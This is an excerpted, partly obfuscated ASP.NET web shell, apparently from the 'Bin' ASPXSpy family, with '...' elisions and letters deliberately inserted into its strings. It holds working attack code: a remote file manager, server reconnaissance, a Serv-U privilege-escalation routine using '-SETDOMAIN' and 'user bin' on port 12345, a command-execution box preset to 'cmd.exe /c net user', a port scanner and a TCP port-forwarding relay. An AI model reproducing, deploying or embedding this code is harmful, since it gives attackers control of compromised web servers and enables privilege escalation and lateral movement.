...
public string vbhLn="kykdfgkjkasf";
public int TdgGU=1;
...
Bin_Button_KillMe.Attributes["onClick"]="if(confirm('Arxe you sure delete kykdfgkjkasf?')){Bin_PostBack('hae','');};";
...
ZGKh.Text="<a href=\"javascript:if(confirm('Are you sure will delete it ?\\n\\nIf non-empty directory,will be xxxxe all the files.')){Bin_PostBack('kRXgt','"+MVVJ(AXSbb.Value+Bin_folder.Name)+"')};\">Del</a> | <a href='#' onclick=\"var filename=prompt('Please input the new folder name:','"+AXSbb.Value.Replace(@"\",@"\\")+Bin_folder.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('dAJTD"+MVVJ(AXSbb.Value+Bin_folder.Name)+"',filename);} \">Rename</a>";
tr.Cells.Add(ZGKh);
UGzP.Rows.Add(tr);
}
...
string mWGEm="IIS://localxhost/W3SVC";
...
WICxe();
ghaB.Visible=true;
Bin_H2_Title.InnerText="System xInformation >>";
Bin_H2_Mac.InnerText="MAC Inforxmation >>";
Bin_H2_Driver.InnerText="Driverx Information >>";
StringBuilder yEwc=new StringBuilder();
StringBuilder hwJeS=new StringBuilder();
StringBuilder jXkaE=new StringBuilder();
yEwc.Append("<li><u>Servexr Domain : </u>"+Request.ServerVariables["SERVER_NAME"]+"</li>");
yEwc.Append("<li><u>Serverx Ip : </u>"+Request.ServerVariables["LOCAL_ADDR"]+":"+Request.ServerVariables["SERVER_PORT"]+"</li>");
yEwc.Append("<li><u>Termixnal Port : </u>"+IKjwH+"</li>");
yEwc.Append("<li><u>Servexr OS : </u>"+Environment.OSVersion+"</li>");
yEwc.Append("<li><u>Servexr Software : </u>"+Request.ServerVariables["SERVER_SOFTWARE"]+"</li>");
yEwc.Append("<li><u>Servexr UserName : </u>"+Environment.UserName+"</li>");
yEwc.Append("<li><u>Servxer Time : </u>"+System.DateTime.Now.ToString()+"</li>");
yEwc.Append("<li><u>Serverx TimeZone : </u>"+cCf("Win32_TimeZone").Rows[0]["Caption"]+"</li>");
DataTable BIOS=cCf("Win32x_BIOS");
yEwc.Append("<li><u>Server BIOS : </u>"+BIOS.Rows[0]["Manufacturer"]+" : "+BIOS.Rows[0]["Name"]+"</li>");
yEwc.Append("<li><u>CPU Cxount : </u>"+cpu.ToString()+"</li>");
yEwc.Append("<li><u>CPU Vexrsion : </u>"+NPPZ+"</li>");
...
string sutI="-SETDOMAIN\r\n-Domain=BIN|0.0.0.0|12345|-1|1|0\r\n-TZOEnable=0\r\n TZOKey=\r\n";
...
ZJiM(NS,iVDT);
Rev(NS);
Bin_Td_Res.InnerHtml+="<font color=\"green\"><b>Execx Cmxd.................\r\n</b></font>";
zvxm.Connect(Request.ServerVariables["LOCAL_ADDR"],12345);
NS1=zvxm.GetStream();
Rev(NS1);
ZJiM(NS1,"user bin\r\n");
Rev(NS1);
...
WICxe();
YwLB.Visible=true;
Bin_H2_Title.InnerText="Por323tScan >>";
}
public void rAhe()
{
WICxe();
iDgmL.Visible=true;
dQIIF.Visible=false;
Bin_H2_Title.InnerText="Data12Base >>";
}
protected void OUj()
{
...
try
{
session ghasdnbg=new session();
ghasdnbg.ldel=ltcpClient;
ghasdnbg.rdel=rtcpClient;
ltcpClient.BeginConnect(mtJ(Localaddress,LocalPort),new AsyncCallback(VTp),ghasdnbg);
}
catch (Exception ex) { }
}
...
try
{
session ghasdnbg=(session)ar.AsyncState;
ltcpClient.EndConnect(ar);
ghasdnbg.rdel.BeginReceive(DPrPL,0,DPrPL.Length,SocketFlags.None,new AsyncCallback(LFYM),ghasdnbg);
ghasdnbg.ldel.BeginReceive(wvZv,0,wvZv.Length,SocketFlags.None,new AsyncCallback(xPS),ghasdnbg);
}
catch (Exception ex) { }
}
...
{
session ghasdnbg=(session)ar.AsyncState;
int Ret=ghasdnbg.rdel.EndReceive(ar);
if (Ret>0)
ltcpClient.BeginSend(DPrPL,0,Ret,SocketFlags.None,new AsyncCallback(JTcp),ghasdnbg);
else lyTOK();
}
catch (Exception ex) { }
}
...
{
session ghasdnbg=(session)ar.AsyncState;
ghasdnbg.ldel.EndSend(ar);
ghasdnbg.rdel.BeginReceive(DPrPL,0,DPrPL.Length,SocketFlags.None,new AsyncCallback(this.LFYM),ghasdnbg);
}
catch (Exception ex) { }
}
...
{
session ghasdnbg=(session)ar.AsyncState;
int Ret=ghasdnbg.ldel.EndReceive(ar);
if (Ret>0)
ghasdnbg.rdel.BeginSend(wvZv,0,Ret,SocketFlags.None,new AsyncCallback(IZU),ghasdnbg);
else lyTOK();
}
catch (Exception ex) { }
}
...
{
session ghasdnbg=(session)ar.AsyncState;
ghasdnbg.rdel.EndSend(ar);
ghasdnbg.ldel.BeginReceive(wvZv,0,wvZv.Length,SocketFlags.None,new AsyncCallback(this.xPS),ghasdnbg);
}
catch (Exception ex) { }
}
public void lyTOK()
...
{
Bin_H2_Title.InnerText="IIxxxxS x >>";
WICxe();
VNR.Visible=true;
AdCx();
}
...
<form id="kykdfgkjkasf" runat="server">
...
<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
 ...
 <tr >
 <td style="width:10%"></td>
 <td colspan="5">CmdShxell&nbsp;&nbsp;:&nbsp;<input class="input" runat="server" id="mHbjB" type="text" size="100" value="cmd.exe /c net user"/> <asp:Button ID="SPhc" CssClass="bt" runat="server" Text="Exploit" OnClick="lRfRj"/></td>
 </tr>
</table>
...
<tr align="center">
<td style="width:5%"></td>
<td style="width:20%" align="left">Local4 Ip : <input class="input" runat="server" id="eEpm" type="text" size="20" value="127.0.0.1"/></td>
<td style="width:20%" align="left">Local3 Port : <input class="input" runat="server" id="iXdh" type="text" size="20" value="3389"/></td>
<td style="width:20%" align="left">Remote3 Ip : <input class="input" runat="server" id="llH" type="text" size="20" value="google.com"/></td>
<td style="width:20%" align="left">Remote2 Port : <input class="input" runat="server" id="ZHS" type="text" size="20" value="80"/></td></tr>
...
<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
<tr align="center">
<td style="width:20%" align="left">Keywo2rd</td>
...
<tr align="center">
<td style="width:20%" align="left">Replace 2As1</td>
...
<asp:TableRow CssClass="head"><asp:TableCell Width="60%">File1 Path</asp:TableCell><asp:TableCell Width="20%">Last modified</asp:TableCell><asp:TableCell Width="20%">Size</asp:TableCell></asp:TableRow>
</asp:Table>
</div>
</td></tr></table>
<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">Copyright &copy; 2006-2009 <a href="http://google.com" target="_blank">Bxog</a> All xs Reserved.</div></div>
</form>
</body>
</html>